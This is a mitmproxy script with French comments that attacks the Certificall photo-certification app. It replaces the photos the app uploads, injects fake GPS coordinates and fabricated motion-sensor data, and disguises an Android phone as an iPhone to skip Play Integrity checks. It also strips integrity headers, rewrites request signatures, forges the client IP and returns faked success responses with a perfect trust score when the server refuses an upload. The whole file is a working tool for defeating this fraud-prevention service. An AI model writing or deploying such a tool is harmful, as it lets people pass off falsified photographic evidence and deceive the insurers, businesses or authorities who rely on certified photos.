"""
MITM Proxy Script — Intercepte le trafic Certificall (mode telephone).
- Remplacement de photo dans l'upload multipart
- Injection GPS dans les requetes trust-services
- Bypass 403 en filet de securite (ne devrait pas se declencher avec vrai Play Integrity)
"""

import json
import os
import re
import time
import hashlib
import urllib.request
import urllib.error
from mitmproxy import http, ctx, tls

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(SCRIPT_DIR, "output")
GPS_CONFIG = os.path.join(SCRIPT_DIR, "gps_config.txt")
IP_CONFIG = os.path.join(SCRIPT_DIR, "ip_config.txt")
DEVICE_CONFIG = os.path.join(SCRIPT_DIR, "device_config.txt")

# Modeles iPhone disponibles {identifiant: (model_id, nom_affichage)}
IPHONE_MODELS = {
    "iPhone 16 Pro Max": "iPhone17,2",
    "iPhone 16 Pro": "iPhone17,1",
    "iPhone 16": "iPhone17,3",
    "iPhone 15 Pro Max": "iPhone16,2",
    "iPhone 15 Pro": "iPhone16,1",
    "iPhone 15": "iPhone15,4",
    "iPhone 14 Pro Max": "iPhone15,3",
    "iPhone 14 Pro": "iPhone15,2",
    "iPhone 14": "iPhone14,7",
    "iPhone 13 Pro": "iPhone14,2",
    "iPhone 13": "iPhone14,5",
}


def _read_gps_config():
    """Lit les coordonnees GPS depuis gps_config.txt (format: lat,lon)."""
    try:
        with open(GPS_CONFIG, "r") as f:
            parts = f.read().strip().split(",")
            if len(parts) == 2:
                return float(parts[0]), float(parts[1])
    except (FileNotFoundError, ValueError):
        pass
    return None, None


def _read_ip_config():
    """Lit l'IP spoofee depuis ip_config.txt."""
    try:
        with open(IP_CONFIG, "r") as f:
            return f.read().strip()
    except FileNotFoundError:
        return "86.234.12.45"


def _read_device_config():
    """Lit le modele iPhone depuis device_config.txt (format: nom_modele)."""
    try:
        with open(DEVICE_CONFIG, "r") as f:
            name = f.read().strip()
            model_id = IPHONE_MODELS.get(name, "iPhone16,1")
            return name, model_id
    except FileNotFoundError:
        return "iPhone 15 Pro", "iPhone16,1"

# Paths a bypasser en 401/403
BYPASS_PATHS = [
    "/v5/certificall/items/updateOrCreate",
]

# Cache des items crees
_item_cache = {}
_item_counter = 10000
_last_case_id = None


def tls_clienthello(data: tls.ClientHelloData):
    """Ignore (passthrough) les connexions TLS non-certificall pour ne pas bloquer internet."""
    host = data.context.server.address[0] if data.context.server.address else ""
    if "certificall" not in host.lower():
        data.ignore_connection = True


def _extract_case_id(content):
    if not content:
        return None
    try:
        data = json.loads(content)
        if isinstance(data, dict) and "caseId" in data:
            return data["caseId"]
    except (json.JSONDecodeError, UnicodeDecodeError):
        pass
    try:
        text = content.decode("utf-8", errors="ignore")
        match = re.search(r'"caseId"\s*:\s*(\d+)', text)
        if match:
            return int(match.group(1))
    except Exception:
        pass
    return None


def _extract_all_fields(content):
    fields = {}
    if not content:
        return fields
    try:
        text = content.decode("utf-8", errors="ignore")
        for field in ["caseId", "stepId", "itemId", "multiStepPos", "position", "type"]:
            match = re.search(rf'"{field}"\s*:\s*("?[\w.-]+"?)', text)
            if match:
                val = match.group(1).strip('"')
                try:
                    fields[field] = int(val)
                except ValueError:
                    fields[field] = val
    except Exception:
        pass
    return fields


def _get_body_key(content):
    if not content:
        return "empty"
    return hashlib.md5(content[:1024]).hexdigest()


def _spoof_ios_fields(body):
    """Remplace les champs Android par iOS dans un dict JSON (recursif).
    Valeurs basees sur un vrai iPhone: Apple iPhone17,3 / ios 26.2.1"""
    if not isinstance(body, dict):
        return
    # Supprimer les champs Android-only
    for android_key in ["androidSDKVersion", "webViewVersion"]:
        if android_key in body:
            del body[android_key]
    for key in list(body.keys()):
        val = body[key]
        if key == "platform" and val == "android":
            body[key] = "ios"
        elif key == "operatingSystem" and val == "android":
            body[key] = "ios"
        elif key == "manufacturer" and isinstance(val, str) and val.lower() != "apple":
            body[key] = "Apple"
        elif key == "model" and isinstance(val, str) and not val.startswith("iPhone"):
            body[key] = _read_device_config()[1]
        elif key == "name" and isinstance(val, str) and "iPhone" not in val:
            body[key] = _read_device_config()[0]
        elif key == "osVersion" and isinstance(val, str) and val != "26.1":
            body[key] = "26.1"
        elif key == "isVirtual":
            body[key] = False
        elif isinstance(val, dict):
            _spoof_ios_fields(val)
        elif isinstance(val, list):
            for item in val:
                if isinstance(item, dict):
                    _spoof_ios_fields(item)


def _should_bypass(path):
    """Verifie si ce path doit etre bypasse en 401/403."""
    for bp in BYPASS_PATHS:
        if bp in path:
            return True
    return False


def _get_latest_photo():
    """Retourne le chemin de la derniere photo traitee dans output/."""
    if not os.path.isdir(OUTPUT_DIR):
        return None
    photos = []
    for f in os.listdir(OUTPUT_DIR):
        fp = os.path.join(OUTPUT_DIR, f)
        if os.path.isfile(fp) and f.lower().endswith((".jpg", ".jpeg")):
            photos.append((os.path.getmtime(fp), fp))
    if not photos:
        return None
    photos.sort(reverse=True)
    return photos[0][1]


def _replace_photo_in_multipart(content, content_type):
    """Remplace la photo JPEG dans un body multipart par la photo du dashboard.
    Retourne le nouveau content, ou None si pas de remplacement."""
    photo_path = _get_latest_photo()
    if not photo_path:
        return None

    # Extraire le boundary du content-type
    boundary_match = re.search(r'boundary=([^\s;]+)', content_type)
    if not boundary_match:
        return None
    boundary = boundary_match.group(1).encode()

    with open(photo_path, "rb") as f:
        replacement_photo = f.read()

    # Decoupe le multipart en parts
    delimiter = b"--" + boundary
    parts = content.split(delimiter)

    new_parts = []
    replaced = False
    for part in parts:
        # Chercher la part qui contient une image (Content-Type: image/)
        if b"Content-Type: image/" in part and not replaced:
            # Garder les headers de la part, remplacer le body
            header_end = part.find(b"\r\n\r\n")
            if header_end == -1:
                new_parts.append(part)
                continue
            headers = part[:header_end + 4]  # inclut le \r\n\r\n
            # Le body se termine par \r\n (avant le prochain boundary)
            new_body = replacement_photo + b"\r\n"
            new_parts.append(headers + new_body)
            replaced = True
            ctx.log.error(f"[PHOTO] Remplacement: {os.path.basename(photo_path)} ({len(replacement_photo)} octets)")
        else:
            new_parts.append(part)

    if not replaced:
        return None

    return delimiter.join(new_parts)


def request(flow: http.HTTPFlow) -> None:
    global _last_case_id
    host = flow.request.pretty_host.lower()
    if "certificall" not in host:
        return

    path = flow.request.path
    method = flow.request.method
    ctx.log.warn(f"[REQ] {method} {path}")

    # === SPOOF iOS : le serveur ne verifie pas Play Integrity pour iOS ===
    device_name, device_model = _read_device_config()
    spoofed_ip = _read_ip_config()

    # User-Agent iPhone + IP spoofee
    flow.request.headers["User-Agent"] = (
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) "
        "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
    )
    # Spoof IP via X-Forwarded-For (le serveur lit souvent l'IP de ce header)
    flow.request.headers["X-Forwarded-For"] = spoofed_ip
    flow.request.headers["X-Real-IP"] = spoofed_ip
    # Supprimer tous les headers Play Integrity / Android
    for key in list(flow.request.headers.keys()):
        kl = key.lower()
        if "integrity" in kl or "x-play" in kl or kl == "x-integrity-error":
            ctx.log.warn(f"[iOS SPOOF] Supprime header: {key}")
            del flow.request.headers[key]
    # Remplacer ANDROID par IOS dans le header signature (REQ_ANDROID_... → REQ_IOS_...)
    for key in list(flow.request.headers.keys()):
        kl = key.lower()
        if kl in ("x-front-request-id", "signature", "x-request-id", "x-signature"):
            val = flow.request.headers[key]
            if "ANDROID" in val:
                flow.request.headers[key] = val.replace("ANDROID", "IOS")
                ctx.log.warn(f"[iOS SPOOF] Signature: ANDROID -> IOS dans {key}")
            elif "_ANDROID_" in val.upper():
                flow.request.headers[key] = val.replace("_ANDROID_", "_IOS_").replace("_android_", "_IOS_")
                ctx.log.warn(f"[iOS SPOOF] Signature: android -> IOS dans {key}")
    # Aussi checker TOUS les headers pour "ANDROID" dans la valeur (filet de securite)
    for key in list(flow.request.headers.keys()):
        val = flow.request.headers[key]
        if "REQ_ANDROID" in val:
            flow.request.headers[key] = val.replace("REQ_ANDROID", "REQ_IOS")
            ctx.log.warn(f"[iOS SPOOF] Header {key}: REQ_ANDROID -> REQ_IOS")
    # Spoofer platform dans les bodies JSON
    ct = flow.request.headers.get("content-type", "")
    if flow.request.content and "json" in ct.lower():
        try:
            body = json.loads(flow.request.content)
            if isinstance(body, dict):
                _spoof_ios_fields(body)
                flow.request.content = json.dumps(body).encode()
        except (json.JSONDecodeError, UnicodeDecodeError):
            pass
    ctx.log.warn(f"[iOS SPOOF] User-Agent -> iPhone, signature + headers + body spoofe")

    if method == "POST" and flow.request.content:
        case_id = _extract_case_id(flow.request.content)
        if case_id:
            _last_case_id = case_id

        # Remplacement de photo + spoof device/GPS dans les uploads multipart vers updateOrCreate
        ct = flow.request.headers.get("content-type", "")
        if "updateOrCreate" in path and "multipart" in ct.lower():
            # 1. Remplacer la photo
            new_content = _replace_photo_in_multipart(flow.request.content, ct)
            if new_content:
                flow.request.content = new_content
                ctx.log.error(f"[PHOTO] Upload intercepte, photo remplacee ({len(new_content)}b)")

            # 2. Spoofer le JSON updateOrCreateItemDto dans le multipart (device + GPS)
            try:
                import random
                content = flow.request.content
                dto_marker = b'"updateOrCreateItemDto"'
                if dto_marker in content or b'updateOrCreateItemDto' in content:
                    # Trouver le JSON dans le multipart (entre les \r\n\r\n et le prochain boundary)
                    parts = content.split(b'updateOrCreateItemDto')
                    if len(parts) > 1:
                        after = parts[1]
                        # Le JSON commence apres \r\n\r\n
                        json_start = after.find(b'\r\n\r\n')
                        if json_start >= 0:
                            json_start += 4
                            json_end = after.find(b'\r\n--', json_start)
                            if json_end > json_start:
                                json_bytes = after[json_start:json_end]
                                dto = json.loads(json_bytes)
                                lat, lon = _read_gps_config()
                                # Spoof device
                                dto["userDeviceManufacturer"] = "Apple"
                                dto["userDeviceModel"] = device_model
                                dto["userDeviceName"] = device_name
                                dto["userDevicePlatform"] = "ios"
                                dto["userDeviceOs"] = "ios"
                                dto["userDeviceOsVersion"] = "26.1"
                                dto["userDeviceWifiIpAddress"] = "192.168.1." + str(random.randint(10, 200))
                                dto["userDeviceCarrierIpAddress"] = "0.0.0.0"
                                # Spoof GPS
                                if lat is not None:
                                    dto["geolocLatitude"] = str(round(lat + random.uniform(-0.0001, 0.0001), 7))
                                    dto["geolocLongitude"] = str(round(lon + random.uniform(-0.0001, 0.0001), 7))
                                    dto["geolocAccuracy"] = str(round(random.uniform(5.0, 12.0), 2))
                                new_json = json.dumps(dto).encode()
                                # Reconstruire le multipart
                                flow.request.content = content.replace(json_bytes, new_json)
                                ctx.log.error(f"[MULTIPART SPOOF] Device: Apple iPhone16,1/ios, GPS: {dto.get('geolocLatitude')},{dto.get('geolocLongitude')}")
            except Exception as e:
                ctx.log.error(f"[MULTIPART SPOOF] Erreur: {e}")

        # Injection GPS + fix sensors + device dans trust-services
        if "trust-services" in path:
            ct = flow.request.headers.get("content-type", "")
            if "json" in ct.lower():
                lat, lon = _read_gps_config()
                if lat is not None:
                    try:
                        body = json.loads(flow.request.content)
                        if isinstance(body, dict):
                            import random
                            # 1. Remplacer GPS dans les champs simples
                            for key in ["latitude", "lat"]:
                                if key in body:
                                    body[key] = lat
                            for key in ["longitude", "lon", "lng"]:
                                if key in body:
                                    body[key] = lon
                            if "location" in body and isinstance(body["location"], dict):
                                body["location"]["latitude"] = lat
                                body["location"]["longitude"] = lon
                            if "gps" in body and isinstance(body["gps"], dict):
                                body["gps"]["latitude"] = lat
                                body["gps"]["longitude"] = lon

                            # 2. Remplacer GPS dans TOUS les historyPositions
                            if "historyPositions" in body and isinstance(body["historyPositions"], list):
                                for pos in body["historyPositions"]:
                                    if isinstance(pos, dict):
                                        pos["lat"] = lat + random.uniform(-0.00015, 0.00015)
                                        pos["long"] = lon + random.uniform(-0.00015, 0.00015)
                                        pos["accuracy"] = round(random.uniform(5.0, 15.0), 2)

                            # 3. Remplacer acceleration/rotation realistes dans historyMotions
                            if "historyMotions" in body and isinstance(body["historyMotions"], list):
                                for mot in body["historyMotions"]:
                                    if isinstance(mot, dict):
                                        # Gravite ~9.8 sur z, petites variations x/y (tel tenu en main)
                                        mot["acceleration"] = {
                                            "x": round(random.uniform(-0.3, 0.3), 2),
                                            "y": round(random.uniform(-0.2, 0.2), 2),
                                            "z": round(random.uniform(9.5, 10.1), 2)
                                        }
                                        # Rotation : beta ~50 (tel incline), petites variations
                                        mot["rotation"] = {
                                            "alpha": round(random.uniform(-5, 5), 1),
                                            "beta": round(random.uniform(40, 65), 1),
                                            "gamma": round(random.uniform(-8, 8), 1)
                                        }

                            # 4. Fix device info complet (coherent iPhone)
                            if "device" in body and isinstance(body["device"], dict):
                                dev = body["device"]
                                dev["manufacturer"] = "Apple"
                                dev["model"] = device_model
                                dev["name"] = device_name
                                dev["platform"] = "ios"
                                dev["operatingSystem"] = "ios"
                                dev["osVersion"] = "26.1"
                                dev["isVirtual"] = False
                                dev["memUsed"] = random.randint(150000000, 250000000)
                                dev["batteryLevel"] = round(random.uniform(0.45, 0.85), 2)
                                dev["isCharging"] = False
                                dev["networkStatus"] = {"connected": True, "connectionType": "wifi"}
                                # Supprimer champs Android
                                dev.pop("androidSDKVersion", None)
                                dev.pop("webViewVersion", None)

                            # 5. Aussi spoofer les champs iOS dans tout le body
                            _spoof_ios_fields(body)

                            flow.request.content = json.dumps(body).encode()
                            ctx.log.warn(f"[GPS+DEVICE] Trust-services spoofe: GPS={lat},{lon}, device=iPhone16,1, sensors=realistes")
                    except (json.JSONDecodeError, UnicodeDecodeError):
                        pass

        # Spoofer aussi les bodies logger/message (ils contiennent du device info)
        if "logger/message" in path:
            ct2 = flow.request.headers.get("content-type", "")
            if flow.request.content and "json" in ct2.lower():
                try:
                    log_body = json.loads(flow.request.content)
                    if isinstance(log_body, dict):
                        _spoof_ios_fields(log_body)
                        # Aussi remplacer des strings "android" dans les valeurs texte
                        for k in list(log_body.keys()):
                            v = log_body[k]
                            if isinstance(v, str):
                                if "V2241A" in v or "vivo" in v.lower():
                                    log_body[k] = v.replace("V2241A", "iPhone16,1").replace("v2241a", "iPhone16,1").replace("vivo", "Apple").replace("Vivo", "Apple")
                                if "android" in v.lower() and "android" != k.lower():
                                    log_body[k] = v.replace("android", "ios").replace("Android", "iOS")
                        flow.request.content = json.dumps(log_body).encode()
                    ctx.log.warn(f"[iOS SPOOF] logger/message body spoofe")
                except (json.JSONDecodeError, UnicodeDecodeError):
                    pass

        # Log le body pour les endpoints importants (INCLUANT logger/message pour debug)
        if "json" in ct.lower():
            try:
                body = flow.request.content.decode("utf-8", errors="ignore")
                if len(body) > 2000:
                    body = body[:2000] + "...[TRONQUE]"
                if "logger/message" in path:
                    ctx.log.warn(f"[LOGGER BODY] {body}")
                else:
                    ctx.log.warn(f"[REQ BODY] {body}")
            except Exception:
                pass
        elif "multipart" in ct.lower():
            # Logger TOUTES les parties texte du multipart (pas juste les champs connus)
            try:
                text_content = flow.request.content.decode("utf-8", errors="replace")
                # Extraire les parties texte (pas les binaires photo)
                text_parts = []
                for part in text_content.split("--"):
                    if "Content-Type: image/" not in part and len(part) < 1000:
                        clean = part.strip()
                        if clean and clean != "--":
                            text_parts.append(clean)
                ctx.log.warn(f"[REQ MULTIPART DETAIL] {' | '.join(text_parts[:10])}")
            except Exception:
                pass
            fields = _extract_all_fields(flow.request.content)
            ctx.log.warn(f"[REQ MULTIPART] fields={json.dumps(fields)}, size={len(flow.request.content)}b")


def response(flow: http.HTTPFlow) -> None:
    global _item_counter, _last_case_id
    host = flow.request.pretty_host.lower()
    if "certificall" not in host:
        return

    status = flow.response.status_code
    path = flow.request.path
    method = flow.request.method

    ctx.log.warn(f"[RESP] {status} {method} {path}")

    # Log response body pour les endpoints importants (pas logger/message)
    if flow.response.content and "logger/message" not in path:
        try:
            body = flow.response.content.decode("utf-8", errors="ignore")
            if len(body) > 2000:
                body = body[:2000] + "...[TRONQUE]"
            ctx.log.warn(f"[RESP BODY] {body}")
        except Exception:
            pass

    # BYPASS 401/403 UNIQUEMENT sur updateOrCreate (filet de securite)
    if status in (401, 403) and _should_bypass(path):
        # Tentative 1: retry direct sans headers integrity
        retry_ok = False
        try:
            ctx.log.error(f"[RETRY] Tentative upload direct sans headers integrity...")
            url = f"https://{flow.request.pretty_host}{path}"
            # Construire les headers propres (sans integrity)
            clean_headers = {}
            for k, v in flow.request.headers.items():
                kl = k.lower()
                if "integrity" not in kl and "x-play" not in kl:
                    clean_headers[k] = v

            req = urllib.request.Request(url, data=flow.request.content, headers=clean_headers, method="POST")
            with urllib.request.urlopen(req, timeout=30) as resp:
                resp_body = resp.read()
                resp_status = resp.status
                resp_ct = resp.headers.get("content-type", "application/json")

            if resp_status in (200, 201):
                ctx.log.error(f"[RETRY] SUCCES! Serveur a accepte: {resp_status}")
                ctx.log.error(f"[RETRY] Response: {resp_body[:500]}")
                flow.response.status_code = resp_status
                flow.response.headers["content-type"] = resp_ct
                flow.response.content = resp_body
                retry_ok = True
            else:
                ctx.log.error(f"[RETRY] Echec: {resp_status}")
        except Exception as e:
            ctx.log.error(f"[RETRY] Erreur: {e}")

        # Tentative 2: si retry echoue, fallback sur fake response
        if not retry_ok:
            body_key = _get_body_key(flow.request.content)
            if body_key in _item_cache:
                item_id = _item_cache[body_key]
                ctx.log.error(f"[BYPASS] {status} -> 200 | {method} {path} (cached id={item_id})")
            else:
                _item_counter += 1
                item_id = _item_counter
                _item_cache[body_key] = item_id
                ctx.log.error(f"[BYPASS] {status} -> 200 | {method} {path} (new id={item_id})")

            fields = _extract_all_fields(flow.request.content)
            case_id = fields.get("caseId", _last_case_id) or 1
            now = int(time.time() * 1000)

            fake_body = {
                "id": item_id,
                "itemId": item_id,
                "caseId": case_id,
                "status": "COMPLETED",
                "success": True,
                "message": "OK",
                "createdAt": now,
                "updatedAt": now,
                "imageUrl": f"https://admin.certificall.app/storage/items/{item_id}.jpg",
                "closed": True,
            }
            for key in ["stepId", "multiStepPos", "position", "type"]:
                if key in fields:
                    fake_body[key] = fields[key]

            ctx.log.error(f"[BYPASS] Fake: {json.dumps(fake_body)}")
            flow.response.status_code = 200
            flow.response.headers["content-type"] = "application/json"
            flow.response.content = json.dumps(fake_body).encode()

    elif status in (401, 403):
        # Log les 401/403 NON-bypasses pour info
        ctx.log.warn(f"[AUTH] {status} {method} {path} (non bypasse, auth flow normal)")

    elif "trust-services" in path and status >= 400:
        ctx.log.error(f"[BYPASS] {status} -> 200 | {method} {path} (trust-services)")
        fake_analysis = {
            "success": True,
            "status": "COMPLETED",
            "trustScore": 100,
            "message": "OK",
            "analysisId": f"analysis-{int(time.time())}",
        }
        flow.response.status_code = 200
        flow.response.headers["content-type"] = "application/json"
        flow.response.content = json.dumps(fake_analysis).encode()

    elif status >= 400:
        ctx.log.error(f"[ERROR] {status} {method} {path}")
